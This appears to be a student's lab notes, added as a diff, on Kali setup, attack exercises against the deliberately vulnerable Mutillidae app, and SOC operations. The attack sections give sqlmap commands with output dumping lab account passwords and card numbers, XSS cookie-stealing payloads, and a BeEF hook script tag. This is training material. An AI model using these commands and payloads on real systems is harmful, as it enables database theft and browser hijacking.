@@ -1,0 +1,431 @@
+#CONFIGURE SSH VIA REMOTE ON KALI:
+Step 1: Install the OpenSSH Server
+	sudo apt update
+
+    sudo apt install openssh-server
+	
+Step 2: Start the SSH Service
+
+	sudo systemctl start ssh
+	
+Step 3: Enable SSH to Start on Boot
+
+	sudo systemctl enable ssh
+	
+Step 4: Verify SSH is Running
+
+	sudo systemctl status ssh
+	sudo systemctl restart ssh
+	/etc/ssh/sshd_config
+	
+
+TASK1: install xampp of linux:
+
+download xampp for linux in kali downloads folder:
+
+sudo chmod +x xampp-linux-x64-8.0.30-0-installer.run 
+sudo ./xampp-linux-x64-8.0.30-0-installer.run 
+cd /opt/lampp
+sudo ./lampp start
+./lampp help
+sudo ./manager-linux-x64.run
+sudo ./uninstall
+
+http://127.0.0.1/mutillidae/src/index.php
+
+
+TASK2: InSTALL DOCKER IN LINUX:
+sudo apt update
+
+sudo apt install docker.io
+sudo apt install podman-docker
+sudo apt --fix-broken install
+
+systemctl enable docker --now
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TASK3: SQL DATABASE INJECTIONS:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson9/index.html
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+
+Y
+
+sqlmap attack:
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" --current-db
+
+y
+
+> 0
+[11:18:32] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.30, PHP, Apache 2.4.58
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:18:32] [INFO] fetching current database
+current database: 'mutillidae'
+[11:18:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
+
+[*] ending @ 11:18:32 /2024-09-04/
+
+sqlmap -u target
+--current-db
+-D mutillidae
+-D mutillidae -T accounts
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae --tables
+no
+0
+
+Database: mutillidae
+[12 tables]
++----------------------------+
+| accounts                   |
+| blogs_table                |
+| captured_data              |
+| credit_cards               |
+| help_texts                 |
+| hitlog                     |
+| level_1_help_include_files |
+| page_help                  |
+| page_hints                 |
+| pen_test_tools             |
+| user_poll_results          |
+| youTubeVideos              |
++----------------------------+
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T accounts --dump
+Y
+0
+
+Database: mutillidae
+Table: accounts
+[25 entries]
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+| cid | is_admin | lastname      | password     | username | firstname | mysignature                             |
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+| 1   | TRUE     | Administrator | adminpass    | admin    | System    | g0t r00t?                               |
+| 2   | TRUE     | Crenshaw      | somepassword | adrian   | Adrian    | Zombie Films Rock!                      |
+| 3   | FALSE    | Pentest       | monkey       | john     | John      | I like the smell of confunk             |
+| 4   | FALSE    | Druin         | password     | jeremy   | Jeremy    | d1373 1337 speak                        |
+| 5   | FALSE    | Galbraith     | password     | bryce    | Bryce     | I Love SANS                             |
+| 6   | FALSE    | WTF           | samurai      | samurai  | Samurai   | Carving fools                           |
+| 7   | FALSE    | Rome          | password     | jim      | Jim       | Rome is burning                         |
+| 8   | FALSE    | Hill          | password     | bobby    | Bobby     | Hank is my dad                          |
+| 9   | FALSE    | Lion          | password     | simba    | Simba     | I am a super-cat                        |
+| 10  | FALSE    | Evil          | password     | dreveil  | Dr.       | Preparation H                           |
+| 11  | FALSE    | Evil          | password     | scotty   | Scotty    | Scotty do                               |
+| 12  | FALSE    | Calipari      | password     | cal      | John      | C-A-T-S Cats Cats Cats                  |
+| 13  | FALSE    | Wall          | password     | john     | John      | Do the Duggie!                          |
+| 14  | FALSE    | Johnson       | 42           | kevin    | Kevin     | Doug Adams rocks                        |
+| 15  | FALSE    | Kennedy       | set          | dave     | Dave      | Bet on S.E.T. FTW                       |
+| 16  | FALSE    | Pester        | tortoise     | patches  | Patches   | meow                                    |
+| 17  | FALSE    | Paws          | stripes      | rocky    | Rocky     | treats?                                 |
+| 18  | FALSE    | Tomes         | lanmaster53  | tim      | Tim       | Because reconnaissance is hard to spell |
+| 19  | TRUE     | Baker         | SoSecret     | ABaker   | Aaron     | Muffin tops only                        |
+| 20  | FALSE    | Pan           | NotTelling   | PPan     | Peter     | Where is Tinker?                        |
+| 21  | FALSE    | Hook          | JollyRoger   | CHook    | Captain   | Gator-hater                             |
+| 22  | FALSE    | Jardine       | i<3devs      | james    | James     | Occupation: Researcher                  |
+| 23  | FALSE    | Skoudis       | pentest      | ed       | Ed        | Commandline KungFu anyone?              |
+| 24  | NULL     | NULL          | pass         | rob      | NULL      | hello                                   |
+| 25  | NULL     | NULL          | pass         | blotot   | NULL      | butut                                   |
++-----+----------+---------------+--------------+----------+-----------+-----------------------------------------+
+
+[11:49:37] [INFO] table 'mutillidae.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/mutillidae/accounts.csv'
+[11:49:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
+
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=blotot&password=pass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
+Y
+0
+
+[11:56:10] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.58, PHP 8.0.30, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:56:10] [INFO] fetching columns for table 'credit_cards' in database 'mutillidae'
+[11:56:10] [WARNING] reflective value(s) found and filtering out
+[11:56:11] [INFO] fetching entries for table 'credit_cards' in database 'mutillidae'
+Database: mutillidae
+Table: credit_cards
+[5 entries] 
++------+-----+------------------+------------+
+| ccid | ccv | ccnumber         | expiration |
++------+-----+------------------+------------+
+| 1    | 745 | 4444111122223333 | 2012-03-01 |
+| 2    | 722 | 7746536337776330 | 2015-04-01 |
+| 3    | 461 | 8242325748474749 | 2016-03-01 |
+| 4    | 230 | 7725653200487633 | 2017-06-01 |
+| 5    | 627 | 1234567812345678 | 2018-11-01 |
++------+-----+------------------+------------+
+
+
+
+
+
+
+
+
+
+TASK3: XSS SCRIPTING VIA COOKIES:
+
+2kinds of xss scripting:
+1.reflected: web redirecte
+2.stored: your js is stored in db/backend 
+
+C:\users\rob\AppData\Local\Google\Chrome\User Data\Default
+
+<h1>Hello</h1>
+
+<script>alert("xss is very possible!!! hahaha")</script>
+
+view page source:
+
+<script>alert(document.cookie)</script>
+
+
+<input type="text name="colour" value=" " />
+
+FF0000">
+
+<input type="text name="colour" value=" " />
+
+FF0000"><script>alert("xss")</script>
+
+<input type="text name="colour" value=" " />
+
+stored XSS:
+
+Lab1:
+./beef
+
+[10:04:55][*] running on network interface: 127.0.0.1
+[10:04:55]    |   Hook URL: http://127.0.0.1:3000/hook.js
+[10:04:55]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+[10:04:55][*] running on network interface: 192.168.108.132
+[10:04:55]    |   Hook URL: http://192.168.108.132:3000/hook.js
+[10:04:55]    |_  UI URL:   http://192.168.108.132:3000/ui/panel
+
+
+<script src="http://192.168.108.132:3000/hook.js"></script>
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ATTACK NO 3:  BUFFER OVERFLOW:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Buffer Overflow may occcur when input is too large to fit inside the space allocated.
+
+Variables and arguments are limited in the amount of information they can hold before the 
+amount of data (or the cardinality) exceeds to capacity of the variable.
+ An unsigned byte can hold the number 255, but the number 256 will either cause an error,
+ be cast to a different representation, or "roll" the variable back to zero.
+
+Exploitation:
+Narrow down the exact length of input that overflows a vulnerable input parameter.
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+soc-ir:
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+1. Phishing Email Reports
+Description: Users report suspicious emails that may contain malicious links or attachments. These emails often impersonate legitimate services or internal contacts.
+SOC Task: Analyze the email headers, URLs, and attachments; sandbox suspicious content; block the sender or domain; educate the user.
+
+2. Endpoint Malware Detection
+Description: Antivirus or EDR solutions detect malware (e.g., Trojans, ransomware, adware) on user endpoints.
+SOC Task: Investigate the detection; isolate the device if necessary; analyze the malware behavior; initiate remediation steps.
+
+3. Suspicious Login Activity
+Description: Unusual or impossible logins (e.g., logins from different countries within minutes) are flagged by the SIEM or IAM solution.
+SOC Task: Verify if login is legitimate or compromised; reset credentials; analyze source IP and geolocation; apply MFA if not enabled.
+
+4. Unusual Network Traffic
+Description: High-volume outbound traffic, traffic to known malicious IPs, or protocol misuse (e.g., DNS tunneling) is detected by IDS/IPS.
+SOC Task: Investigate traffic source; correlate with endpoint behavior; block IP or domain; escalate if part of a larger incident.
+
+5. Vulnerability Scan Alerts
+Description: Scheduled or ad-hoc vulnerability scans detect unpatched systems or open ports that shouldn’t be exposed.
+SOC Task: Confirm asset ownership; prioritize remediation with IT; track patching; escalate high-severity CVEs.
+
+6. Data Loss Prevention (DLP) Alerts
+Description: Alerts are generated when sensitive data (e.g., PII, PCI) is being sent out of the network or copied to USB/storage devices.
+SOC Task: Review content and context; determine if action was authorized; escalate data exfiltration attempts.
+
+7. Unauthorized Application Execution
+Description: Execution of non-approved or blacklisted applications (e.g., Tor, Mimikatz, crypto miners) on endpoints.
+SOC Task: Investigate execution context; isolate host; perform memory/disk forensics if needed; enforce application control policies.
+
+8. Firewall/IPS Blocked Connection Attempts
+Description: Repeated attempts to access blocked ports, services, or IPs (often probing or scanning).
+SOC Task: Identify source; check if internal or external; assess whether part of a larger campaign; report to threat intel team.
+
+9. Account Lockouts / Brute Force Attempts
+Description: Multiple failed login attempts leading to account lockouts, often indicating password guessing or brute-force attempts.
+SOC Task: Correlate with login logs; identify attack source; block IPs; reset affected accounts; enforce account lockout policies.
+
+10. Insider Threat / Privilege Abuse
+Description: Excessive access to files, unusual hours of activity, or accessing data not relevant to the user’s role.
+SOC Task: Audit access logs; check for previous behavioral patterns; alert HR or Legal if needed; limit user privileges.
+
+🔹 Tier 1 – Alert Analyst (Frontline / Monitoring & Triage)
+Role: First line of defense.
+Responsibilities:
+Monitor SIEM dashboards, EDR, and other alerting tools.
+Triage incoming alerts: validate false positives vs real threats.
+Document and escalate incidents as needed.
+Skills: Basic understanding of security concepts, logs, and common threats (e.g., phishing, malware, brute force).
+
+🔹 Tier 2 – Incident Responder (Investigation & Escalation)
+Role: Handles alerts escalated by Tier 1.
+
+Responsibilities:
+Perform deep-dive analysis on suspicious activity.
+Correlate data across logs, endpoints, and network tools.
+Contain threats (e.g., isolate machines, reset credentials).
+Work closely with IT for remediation.
+Skills: Strong forensic, networking, and incident response skills; familiarity with threat actor TTPs.
+
+🔹 Tier 3 – Threat Hunter / Forensics Expert
+Role: Proactive defender.
+Responsibilities:
+Hunt for undetected threats using advanced tools and hypotheses.
+Perform forensic analysis (disk, memory, packet captures).
+Reverse engineer malware if needed.
+Improve detection rules (e.g., SIEM tuning, custom YARA/Sigma rules).
+Skills: Deep threat intelligence, malware analysis, scripting (Python/PowerShell), MITRE ATT&CK knowledge.
+
+🔹 Tier 4 – SOC Engineer / Architect
+Role: Builds and maintains the SOC infrastructure.
+Responsibilities:
+Manage and tune SIEM, SOAR, EDR, IDS/IPS, etc.
+Automate workflows (e.g., using SOAR platforms).
+Ensure log sources are correctly ingested and parsed.
+Work with DevOps or Cloud teams to secure cloud/SaaS assets.
+Skills: Systems integration, scripting/automation, architecture, security tools engineering.
+
+🔹 Tier 5 – SOC Manager / CISO / Threat Intelligence Lead
+Role: Strategic leadership and oversight.
+Responsibilities:
+Oversee all SOC operations and KPIs (MTTD, MTTR, etc.).
+Communicate risks and incidents to executive leadership.
+Set policies, compliance alignment (e.g., ISO, NIST, GDPR).
+Coordinate red team/blue team exercises.
+Manage threat intelligence program and liaise with external agencies.
+Skills: Leadership, governance, threat intelligence, legal/compliance knowledge, executive communication.
+
+Service Level Agreements (SLAs) are critical for maintaining efficiency, accountability, and compliance. Below are the Top 5 essential SOC SLAs commonly documented and enforced in top-tier SOC environments, along with brief descriptions:
+Cybersecurity Operations Center (SOC), SLAs (Service Level Agreements) are critical to ensure consistent, timely, and measurable security response. Below are the Top 5 essential SLAs in a modern SOC, along with their most common time parameters (in minutes) for metrics such as MTTR, MTTD, etc.
+
+🔹 1. MTTD – Mean Time to Detect
+Description: The average time it takes from the occurrence of a security event to its detection by the SOC.
+Purpose: Measures how fast threats are identified by the monitoring systems (SIEM, EDR, IDS).
+Typical SLA Time:
+High/Critical: ≤ 15 minutes
+Medium/Low: ≤ 30–60 minutes
+
+🔹 2. MTTA – Mean Time to Acknowledge / Triage
+Description: The time from when an alert or incident is raised to when a SOC analyst acknowledges and begins triaging it.
+Purpose: Ensures the SOC is actively responding to alerts in a timely fashion.
+Typical SLA Time:
+Critical alerts: ≤ 15 minutes
+All other alerts: ≤ 30 minutes
+
+🔹 3. MTTR – Mean Time to Respond / Resolve
+Description: The average time to fully contain, eradicate, and recover from a security incident after detection.
+Purpose: Measures SOC efficiency in remediating threats.
+Typical SLA Time:
+
+Critical incidents: ≤ 240 minutes (4 hours)
+High: ≤ 480 minutes (8 hours)
+Medium/Low: ≤ 1–3 business days
+
+🔹 4. Threat Notification SLA
+Description: Timeframe within which stakeholders (e.g., CISO, IT, legal) must be notified after confirmation of a security incident.
+Purpose: Ensures timely escalation and compliance with regulatory timelines (e.g., GDPR, HIPAA).
+Typical SLA Time:
+Confirmed breach or critical incident: ≤ 60 minutes
+Other security events: ≤ 120 minutes
+
+🔹 5. Reporting SLA
+Description: Defines the frequency and timeliness of SOC reports (incident summaries, threat intel, KPI dashboards).
+Purpose: Maintains transparency, accountability, and regulatory compliance.
+Typical SLA Time:
+Daily report of critical incidents: by end of business day (EOD)
+Weekly incident summary: within Monday 12:00 PM
+Monthly executive report: by the 3rd business day of each month
+
+In both internal SOCs and external SOC-as-a-Service providers like MSSPs (Managed Security Service Providers) and MSPs (Managed Service Providers), there is a core set of security services that are almost always offered to ensure comprehensive cyber defense.
+
+Here are the Top 5 SOC services commonly offered across most SOC centers, MSSPs, and MSPs:
+
+🔹 1. 24/7 Threat Monitoring and Detection
+Who offers it: SOC, MSSP, MSP (with security services)
+What it includes:
+Real-time monitoring of endpoints, servers, network traffic, cloud environments.
+Use of SIEM, EDR, and IDS/IPS tools to detect suspicious or malicious behavior.
+Why it matters: Provides constant vigilance to identify threats early, including zero-day attacks and insider threats.
+
+🔹 2. Incident Response and Containment
+Who offers it: SOC, MSSP
+What it includes:
+Rapid response to verified security incidents (e.g., malware outbreaks, ransomware, data breaches).
+Threat containment (e.g., isolating infected devices, blocking malicious IPs).
+Forensics, root cause analysis, and post-incident reporting.
+Why it matters: Limits damage and accelerates recovery during cyberattacks.
+
+🔹 3. Threat Intelligence and Correlation
+Who offers it: SOC, MSSP
+What it includes:
+Aggregation of global and industry-specific threat intelligence.
+Enrichment of alerts with context (IOCs, TTPs, attack patterns).
+Use of MITRE ATT&CK and other frameworks to map threat behavior.
+Why it matters: Enhances detection accuracy and reduces false positives.
+
+🔹 4. Vulnerability Management and Patch Validation
+Who offers it: SOC, MSSP, MSP (especially for endpoint/server management)
+What it includes:
+Regular scanning of infrastructure for known vulnerabilities (CVEs).
+Prioritization of remedition efforts based on risk levels.
+Patch status monitoring and compliance reporting.
+Why it matters: Reduces exploitable weaknesses and hardens the environment.
+
+🔹 5. Security Reporting, Compliance, and Audit Support
+Who offers it: SOC, MSSP, MSP
+What it includes:
+Periodic dashboards, threat reports, SLA performance metrics.
+Support for regulatory frameworks like ISO 27001, PCI-DSS, HIPAA, GDPR.
+Audit preparation and evidence collection (e.g., log retention, DLP events).
+Why it matters: Ensures transparency, accountabiliy, and legal/regulatory alignment.
+
+✅ Top 8 SOC Services (Ranked High to Low)
+Rank	SOC Service	Description
+1️⃣	24/7 Threat Monitoring and Detection	Continuous real-time monitoring of logs, network traffic, endpoints, and cloud assets using SIEM, EDR, IDS/IPS to detect and alert on threats.
+
+2️⃣	Incident Response and Containment	Investigating, containing, and remediating security incidents such as ransomware, phishing, or unauthorized access. Often includes forensic analysis and recovery steps.
+
+3️⃣	Vulnerability Management	Scanning systems and software for known vulnerabilities, prioritizing risks, and recommending or tracking patching/remediation efforts.
+
+4️⃣	Threat Intelligence Integration	Enriching alerts with IOCs, attacker behavior patterns (TTPs), and threat actor information using feeds, OSINT, and commercial intel.
+
+5️⃣	Security Device Management	Managing and tuning firewalls, SIEM, EDR, IDS/IPS, DLP, and antivirus systems, ensuring they are up to date, optimized, and generating quality alerts.
+
+6️⃣	Log Management and Retention	Collecting, storing, and indexing logs from various devices and cloud services for compliance, auditing, and forensic investigation.
+
+7️⃣	Compliance and Reporting Support	Generating security reports, maintaining audit trails, and helping meet frameworks like NIST, ISO 27001, PCI-DSS, HIPAA, GDPR, DPA
+
+8️⃣	Security Awareness & User Education	Providing phishing simulations, security training, and policy awareness to reduce human error and social engineering risks.
+
+
+
+
+
+
+
